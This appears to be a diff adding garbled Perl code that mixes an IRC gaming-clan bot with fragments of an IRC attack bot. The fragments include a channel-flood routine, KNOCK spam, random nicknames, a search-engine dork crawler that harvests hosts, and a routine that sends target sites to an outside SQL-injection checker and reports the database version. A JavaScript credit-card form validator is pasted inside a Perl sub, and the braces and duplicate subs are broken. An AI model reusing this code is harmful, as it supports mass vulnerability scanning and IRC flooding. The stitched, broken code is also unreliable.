+sub connect { return "connect $config{matchserver}; password $config{matchserverpwd}";  }
+
+sub help {
+        my @return = ("[List of triggers and usage]", "!rank: Current ranking", "!last: Latest match result",
+        "!online: Players online on $config{matchserver}", "!ts: Players online on teamspeak", 
+        "!judge <clanid>: Check to see of the clan is worth playing", "!challenge <clanid> <players> <map> <server>: Challenge clan",
+        "!quote: Show random quote from the codstats database", "!8: The Magic 8-Ball", "!connect: Connect link", "!link: Clanbase link");
+
+        return @return;
+}
+
+
+
+sub charge
+{
+$tchan = $_[0];
+$oldfh = select($irc_socket);
+print "JOIN $tchan\r\n" if $tchan =~ /#/;
+#print "NICK ", getnick(8), "\r\n";
+#print "PRIVMSG $tchan :OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOLOLO OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLO OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLO\r\n";
+#print "PRIVMSG $tchan :OLOLOEROLOLOEROLOLOEROLOLOEROLOLOLOLOOLOLOOLOLOOL OLOOLOLOOLOLOOLOLOOLOLOOLOLOEROLOLOEROLOLOEROLOLOE ROLOLOEROLOLOEROLOLOEROLOLOEROLOLOEROLOLOEROLOLOER \r\n";
+#print "PRIVMSG $tchan :OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOOLOLOOLOLOOLOLOO LOLOOLOLOOLOLOOLOLOOLOLOOLOLLOOLOLOOLOLOOLOLOOLOLO OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLO\r\n";
+#print "PART $tchan\r\n" if $tchan =~ /#/;
+#print "JOIN $tchan\r\n" if $tchan =~ /#/;
+#print "PRIVMSG $tchan :OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOLOLOOLOLOOLOLO OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLO OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLO\r\n";
+#print "PRIVMSG $tchan :OLOLOEROLOLOEROLOLOEROLOLOEROLOLOEROLOLOOLOLOOLOL OOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOLOLOEROLOLOEROLOLOE ROLOLOEROLOLOEROLOLOEROLOLOEROLOLOEROLOLOEROLOLOER \r\n";
+#print "PRIVMSG $tchan :OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOL OOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOLOLOOLOLOOLOLOOLOLO OLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLOOLOLO\r\n";
+#print "PART $tchan\r\n" if $tchan =~ /#/;
+select($oldfh);
+return 1;
+}
+
+sub knock
+{
+$oldfh = select($irc_socket);
+#print "KNOCK $_[0]\r\n";
+#print "KNOCK $_[0]\r\n";
+#print "KNOCK $_[0]\r\n";
+select($oldfh);
+}
+sub say
+{
+$oldfh = select($irc_socket);
+#print "PRIVMSG $_[0] :$_[1]\r\n";
+select($oldfh);
+}
+sub irc_connect
+{
+$cycle = 1;
+while(true)
+{
+#print "\r".'Awaiting connection... ['.$cycle++.']';
+$irc_socket = new IO::Socket::INET
+(
+'LocalAddr' => $cfg{LOCAL_ADDR},
+'PeerAddr' => $cfg{SERVER},
+'PeerPort' => $cfg{PORT},
+'Proto' => 'tcp',
+'Timeout' => 10
+);
+last if defined $irc_socket;
+}
+$irc_socket->autoflush(1);
+
+#print $irc_socket "NICK ", $cfg{NICK}, "\r\n";
+#print $irc_socket "USER ", $cfg{IDENT}, " ", $irc_socket->sockhost, " ", $cfg{SERVER}, " :", $cfg{NAME}, "\r\n";
+
+while (<$irc_socket>)
+{
+#print $_;
+if($_ =~ /433/)
+{
+$cfg{NICK} = getnick(8);
+#print $irc_socket "NICK ", $cfg{NICK}, "\r\n";
+next;
+}
+elsif($_ =~ /^PING\s\:([^\r]+)/)
+{
+#print $irc_socket "PONG $1\r\n";
+#print "ping-ponged..\n";
+last;
+}
+elsif($_ =~ /^\:.+?\s001\s([^\s\#]+)\s\:/)
+{
+last;
+}
+}
+#print $irc_socket "USER ", $cfg{IDENT}, " ", $irc_socket->sockhost, " ", $cfg{SERVER}, " :", $cfg{NAME}, "\r\n";
+
+if($cfg{UMODE2_x} == 1)
+{
+#print $irc_socket "UMODE2 +x\r\n";
+}else{
+#print $irc_socket "UMODE2 -x\r\n";
+}
+#print $irc_socket "PART #hackzona\r\n";
+#print $irc_socket "JOIN $ajoin\r\n";
+
+}
+
+sub getnick
+{
+my $Nres;
+while (length $Nres != $_[0])
+{
+foreach my $Nrand (a..z)
+{
+if(int rand 20 == 5)
+{
+$Nres .= $Nrand;
+last;
+}
+}
+}
+return $Nres;
+}
+
+
+
+
+
+sub webcrawler()
+
+{
+
+	my $dork    = &urlencode($_[0]);
+
+	my $html    = "";
+
+	my @results = ();
+
+	my @unique_links = ();
+
+	
+
+	for($i = 0; $i < 100; $i += 10)
+
+	{				
+
+		$html .= &http_request("http://www.webcrawler.com/webcrawler/ws/results/Web/".$dork."/3/0/0/Relevance/zoom=off/qi=".$i."/qk=20/bepersistence=true/_iceUrlFlag=7?_IceUrl=true");
+
+	}
+
+	
+
+	while($html =~ m/target=\"_blank\">(.+?)<\/a>/g)
+
+	{
+
+		my @tmp_link = &get_all_host($1);
+
+		push(@results,@tmp_link);
+
+	}
+
+	
+
+	@unique_links = &unique(@results);
+
+
+
+	return(@unique_links);
+
+}
+
+sub frmvalidator
+{
+	
+  var frmvalidator  = new Validator("form");
+
+  frmvalidator.EnableMsgsTogether();
+  
+  frmvalidator.addValidation("charge_total","req","Please enter donation amount");
+  
+  frmvalidator.addValidation("bill_first_name","req","Please enter your First Name");
+  
+  frmvalidator.addValidation("bill_last_name","req","Please enter your Last Name");
+  
+  frmvalidator.addValidation("bill_address_one","req","Please enter your street address");
+  
+  frmvalidator.addValidation("bill_city","req","Please enter your city");
+  
+  frmvalidator.addValidation("bill_state_or_province","req","Please enter your Province/ State");
+  
+  frmvalidator.addValidation("bill_postal_code","req","Please enter your Postal/ Zip Code");
+  
+  frmvalidator.addValidation("bill_country","req","Please enter your country of residence");
+  
+  frmvalidator.addValidation("email","maxlen=50");
+  frmvalidator.addValidation("email","req");
+  frmvalidator.addValidation("email","email");
+  frmvalidator.addValidation("pass","req");
+
+  frmvalidator.addValidation("bill_phone","req","Please enter your Phone Number");
+  frmvalidator.addValidation("bill_phone","maxlen=18");
+  
+  
+  frmvalidator.addValidation("cardholder","req","Please enter cardholder name");
+  frmvalidator.addValidation("cc_num","req","Please enter credit card number");
+ 
+}
+
+sub racchiudi
+
+{
+
+chomp($website);
+
+chop($website);
+
+my $website = shift;
+
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+
+my $formfiller = WWW::Mechanize::FormFiller->new();
+
+$agent->env_proxy();
+
+
+
+  $agent->get("http://nubiescript.com/demo/sqlinject/?mysql=1&vuln=1&link=$website");
+
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+
+  $agent->submit();
+
+#print "ecco: $website--\n";
+
+if ($agent->content() =~/Version\: \<font color\=red\>(.*?)<\/font>/) {
+
+				&respond_to_privmsg(\%msg,"15[7SERViCES15]12 Version: ".$1."  ");
+
+#print "versione ".$1." ";
+
+}else{
+
+$irc_socket->write("PRIVMSG ".$chans[1].": Impossibile cliccare su $website \r\n");
+
+}
+}		
+		
+sub write_to_file()
+{
+	my($file,$data) = @_;
+	open(FILE,'>>',$file);
+	#print FILE $data . "\n";
+	close(FILE);
+
+{	
+my @us_ag = (	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",	"Opera/8.5 (X11; Linux i686; U; cs)",	"Links (2.1pre17; Linux 2.6.11-gentoo-r8 i686; 80x24)"	);	return(@us_ag);}sub get_all_host(){	my $site =  $_[0];	
+my @dirs =  ();	
+my @ret  =  ();	
+my $tmp  =  "";	
+$site    =~ s/http:\/\///g;	
+$site    =~ s/[\r\n]//g;	
+$site    =~ s/\/\///g;	
+if($site !~ /\/$/)	{		$site .= "/";	}	
+@dirs = split(/\//,$site);	$tmp = $dirs[0] . "/";	push(@ret,$tmp);		for($i = 1; $i < scalar(@dirs); $i++)	{		$tmp .= $dirs[$i] . "/";		push(@ret,$tmp);	}		return(@ret);}
+}
+
+sub read_all_file_array()
+{
+my $file = $_[0];	my @ret  = ();	open(FILE,'<',$file);	while($a = <FILE>)	{		$a =~ s/[\r\n]//g;		push(@ret,$a);	}	close(FILE);		return(@ret);}
+
+sub write_to_file_array(){
+	my ($file,$data,$scal) = @_;	for($i = 0; $i < $scal; $i++)	{		&write_to_file($file,$data->[$i]);	}
+		}
+	
+	}
+	#####################################################################################
+sub changecmd()
+{
+        my $n = $_[0];
+        push(@botcmd,$n);
+}
+#####################################################################################
+sub get_content() {
+    my $url = $_[0];
+    my $ua = LWP::UserAgent->new(agent => $uagent);
+    $ua->timeout(10);
+    my $req = HTTP::Request->new(GET => $url);
+    my $res = $ua->request($req);
+    return $res->content;
+}
+#####################################################################################
+sub read_all_file_array()
+{
+        my $file = $_[0];
+        my @ret  = ();
+ 
+        open(FILE,'<',$file);
+        while($a = <FILE>)
+        {
+                $a =~ s/[\r\n]//g;
+                push(@ret,$a);
+        }
+        close(FILE);
+       
+        return(@ret);
+}
+#####################################################################################
+sub write_to_file_array()
+{
+        my ($file,$data,$scal) = @_;
+        for($i = 0; $i < $scal; $i++)
+        {
+                &AddLog($file,$data->[$i]);
+        }
+}
+#####################################################################################
+}
